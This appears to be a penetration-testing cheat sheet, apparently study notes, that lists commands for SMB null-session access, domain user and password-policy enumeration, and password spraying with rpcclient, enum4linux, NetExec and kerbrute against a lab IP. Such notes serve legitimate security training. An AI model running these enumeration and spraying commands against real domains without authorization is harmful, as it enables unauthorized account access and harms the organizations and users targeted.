**Overview:**
- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
- Password spraying involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. 
---
## SMB Null Sessions

```
rpcclient -U "" -N 172.16.5.5
```

Connects via anonymous login to discover domain information through SMB null sessions.

---
## User Enumeration

```
enum4linux -U 172.16.5.5 | grep "user:"
```

Enumerates user accounts, filtered through `grep` to show only users.

```
nxc smb 172.16.5.5 --users
```

Discovers users in the domain via NetExec.

---
## Password Policy

```
enum4linux -P 172.16.5.5
```

Enumerates the password policy on a target Windows domain.

```
nxc smb 172.16.5.5 -u <user> -p <password> --pass-pol
```

Enumerates the password policy using NetExec with valid credentials. `--pass-pol` retrieves policy.

---
## Password Spraying

```
kerbrute passwordspray -d <domain> --dc 172.16.5.5 valid_users.txt <password>
```

Sprays a single password against a list of valid users via Kerberos. `-d` domain, `--dc` DC IP. 

```
sudo nxc smb 172.16.5.5 -u valid_users.txt -p <password> | grep +
```

Same attack via NetExec from a Linux host. `grep +` filters out failed logons.